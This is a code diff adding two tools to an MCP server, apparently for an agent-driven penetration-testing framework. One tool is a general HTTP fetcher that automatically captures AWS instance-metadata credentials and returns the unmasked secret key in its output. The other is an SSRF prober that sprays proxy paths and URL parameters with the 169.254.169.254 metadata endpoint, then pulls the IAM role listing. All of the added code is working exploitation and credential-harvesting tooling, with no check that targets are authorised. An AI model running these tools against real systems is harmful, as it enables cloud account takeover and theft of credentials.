@@ -11,6 +11,7 @@ import json
 import logging
 import os
 import shutil
+import urllib.parse
 from pathlib import Path
 
 from mcp.server.fastmcp import FastMCP
@@ -533,6 +534,271 @@ async def web_screenshot(url: str) -> str:
             "facts": facts,
             "raw_output": stdout[:2000],
         })
+
+
+# ---------------------------------------------------------------------------
+# Tool 5: HTTP Fetch
+# ---------------------------------------------------------------------------
+
+MAX_BODY_SIZE = 4096
+
+_fetch_semaphore = asyncio.Semaphore(SCAN_RATE_LIMIT)
+
+
+def _detect_imds_credential(body: str) -> dict | None:
+    """Detect AWS IMDS credential in response body."""
+    try:
+        data = json.loads(body)
+        if all(k in data for k in ("AccessKeyId", "SecretAccessKey", "Token")):
+            return {
+                "access_key_id": data["AccessKeyId"],
+                "secret_access_key": data["SecretAccessKey"],
+                "token": data["Token"],
+                "expiration": data.get("Expiration", ""),
+                "code": data.get("Code", ""),
+            }
+    except (json.JSONDecodeError, TypeError):
+        pass
+    return None
+
+
+@mcp.tool()
+async def web_http_fetch(
+    url: str,
+    method: str = "GET",
+    headers: dict[str, str] | None = None,
+    body: str | None = None,
+    follow_redirects: bool = True,
+) -> str:
+    """Send an HTTP request and return the response.
+
+    Automatically detects AWS IMDS credentials in response bodies.
+
+    Args:
+        url: Target URL (http/https only).
+        method: HTTP method (GET, POST, PUT, DELETE, etc.).
+        headers: Optional request headers.
+        body: Optional request body (for POST/PUT).
+        follow_redirects: Whether to follow HTTP redirects.
+
+    Returns:
+        JSON string with Athena-compatible facts:
+        - web.http.response: "{url}|{status}|{content_type}|{body_preview}"
+        - cloud.aws.iam_credential: "{AccessKeyId}|{Expiration}" (if detected)
+    """
+    parsed = urllib.parse.urlparse(url)
+    if parsed.scheme not in ("http", "https"):
+        return _make_error(
+            "INVALID_URL",
+            f"Unsupported URL scheme '{parsed.scheme}'. Only http and https are allowed.",
+        )
+
+    import httpx
+
+    async with _fetch_semaphore:
+        try:
+            async with httpx.AsyncClient(
+                follow_redirects=follow_redirects,
+                timeout=httpx.Timeout(SCAN_TIMEOUT_SEC),
+            ) as client:
+                response = await client.request(
+                    method=method.upper(),
+                    url=url,
+                    headers=headers,
+                    content=body.encode() if body else None,
+                )
+        except (httpx.TimeoutException, asyncio.TimeoutError):
+            return _make_error("TIMEOUT", f"Request to {url} timed out after {SCAN_TIMEOUT_SEC}s")
+        except Exception as exc:
+            return _make_error("CONNECTION_ERROR", f"Request to {url} failed: {exc}")
+
+    status = response.status_code
+    content_type = response.headers.get("content-type", "")
+    body_text = response.text
+    body_truncated = body_text[:MAX_BODY_SIZE]
+    body_preview = body_text[:100]
+
+    facts: list[dict[str, str]] = []
+
+    facts.append({
+        "trait": "web.http.response",
+        "value": f"{url}|{status}|{content_type}|{body_preview}",
+    })
+
+    credential = _detect_imds_credential(body_text)
+    if credential:
+        # ADR-048: Store masked secret in value for safe display,
+        # full credential JSON in raw_output for programmatic use
+        secret = credential['secret_access_key']
+        masked_secret = f"{secret[:8]}...{secret[-4:]}" if len(secret) > 12 else "***"
+        facts.append({
+            "trait": "cloud.aws.iam_credential",
+            "value": f"{credential['access_key_id']}|{masked_secret}|{credential['expiration']}",
+            "raw_output": json.dumps(credential),
+        })
+
+    return json.dumps({
+        "facts": facts,
+        "raw_output": body_truncated,
+    })
+
+
+# ---------------------------------------------------------------------------
+# Tool 6: SSRF Probe
+# ---------------------------------------------------------------------------
+
+PROXY_PATHS = [
+    "/proxy/", "/redirect/", "/fetch/", "/forward/", "/url/",
+    "/request/", "/ssrf/", "/load/", "/read/", "/content/",
+    "/navigate/", "/open/", "/browse/", "/preview/",
+]
+
+SSRF_PARAMS = ["url", "dest", "redirect", "path", "next", "data", "load", "fetch"]
+
+IMDS_CANARY = "169.254.169.254/latest/meta-data/"
+IMDS_MARKERS = ("ami-id", "instance-id", "security-credentials")
+
+_SSRF_PROBE_TIMEOUT = 5
+_ssrf_semaphore = asyncio.Semaphore(SCAN_RATE_LIMIT)
+
+
+async def _ssrf_get(
+    client: "httpx.AsyncClient", url: str
+) -> tuple[int, str] | None:
+    """GET with semaphore + short timeout. Returns (status, body) or None."""
+    async with _ssrf_semaphore:
+        try:
+            resp = await client.get(url)
+            return resp.status_code, resp.text[:4096]
+        except Exception:
+            return None
+
+
+def _has_imds_markers(body: str) -> bool:
+    body_lower = body.lower()
+    return any(m in body_lower for m in IMDS_MARKERS)
+
+
+@mcp.tool()
+async def web_ssrf_probe(target_url: str) -> str:
+    """Probe a web application for SSRF vulnerabilities.
+
+    Tests common path-based proxies, parameter-based SSRF patterns,
+    and validates with IMDS canary requests.
+
+    Args:
+        target_url: Base URL to probe (e.g. http://example.com).
+
+    Returns:
+        JSON string with Athena-compatible facts:
+        - web.vuln.ssrf: "{type}|{endpoint}|{canary_result}"
+        - cloud.aws.imds_role: "{role_name}" (if IMDS role listing detected)
+    """
+    parsed = urllib.parse.urlparse(target_url)
+    if parsed.scheme not in ("http", "https"):
+        return _make_error(
+            "INVALID_URL",
+            f"Unsupported URL scheme '{parsed.scheme}'. Only http and https are allowed.",
+        )
+
+    import httpx
+
+    base = target_url.rstrip("/")
+    facts: list[dict[str, str]] = []
+    raw_parts: list[str] = []
+
+    async with httpx.AsyncClient(
+        follow_redirects=True,
+        timeout=httpx.Timeout(_SSRF_PROBE_TIMEOUT),
+    ) as client:
+
+        # ── Phase 1: Path-based proxy discovery ──
+        phase1_tasks = [
+            _ssrf_get(client, f"{base}{path}")
+            for path in PROXY_PATHS
+        ]
+        phase1_results = await asyncio.gather(*phase1_tasks)
+
+        live_paths: list[str] = []
+        for path, result in zip(PROXY_PATHS, phase1_results):
+            if result is None:
+                continue
+            status, body = result
+            if status not in (404, 403, 405):
+                live_paths.append(path)
+                raw_parts.append(f"path_probe {path} -> {status}")
+
+        # ── Phase 2: IMDS canary on live paths ──
+        if live_paths:
+            phase2_tasks = [
+                _ssrf_get(client, f"{base}{path}{IMDS_CANARY}")
+                for path in live_paths
+            ]
+            phase2_results = await asyncio.gather(*phase2_tasks)
+
+            for path, result in zip(live_paths, phase2_results):
+                endpoint = f"{base}{path}{IMDS_CANARY}"
+                imds_confirmed = False
+
+                if result is not None:
+                    status, body = result
+                    if _has_imds_markers(body):
+                        imds_confirmed = True
+                        facts.append({
+                            "trait": "web.vuln.ssrf",
+                            "value": f"path_proxy|{endpoint}|imds_confirmed",
+                        })
+                        raw_parts.append(f"IMDS confirmed via {endpoint}")
+
+                        # Check for role listing
+                        cred_path = f"{base}{path}169.254.169.254/latest/meta-data/iam/security-credentials/"
+                        role_result = await _ssrf_get(client, cred_path)
+                        if role_result:
+                            _, role_body = role_result
+                            role_name = role_body.strip().split("\n")[0].strip()
+                            if role_name and "<!doctype" not in role_name.lower():
+                                facts.append({
+                                    "trait": "cloud.aws.imds_role",
+                                    "value": role_name,
+                                })
+
+                if not imds_confirmed:
+                    # Path was live in Phase 1 but IMDS canary didn't confirm
+                    facts.append({
+                        "trait": "web.vuln.ssrf",
+                        "value": f"path_proxy|{base}{path}|response_200",
+                    })
+
+        # ── Phase 3: Parameter-based SSRF ──
+        imds_url = f"http://{IMDS_CANARY}"
+        phase3_tasks = [
+            _ssrf_get(client, f"{base}?{param}={imds_url}")
+            for param in SSRF_PARAMS
+        ]
+        phase3_results = await asyncio.gather(*phase3_tasks)
+
+        for param, result in zip(SSRF_PARAMS, phase3_results):
+            if result is None:
+                continue
+            status, body = result
+            endpoint = f"{base}?{param}={imds_url}"
+
+            if _has_imds_markers(body):
+                facts.append({
+                    "trait": "web.vuln.ssrf",
+                    "value": f"param_ssrf|{endpoint}|imds_confirmed",
+                })
+                raw_parts.append(f"IMDS confirmed via param {param}")
+            elif status in (301, 302, 303, 307, 308):
+                facts.append({
+                    "trait": "web.vuln.ssrf",
+                    "value": f"open_redirect|{endpoint}|redirect_confirmed",
+                })
+
+    return json.dumps({
+        "facts": facts,
+        "raw_output": "\n".join(raw_parts)[:2000],
+    })
 
 
 # ---------------------------------------------------------------------------
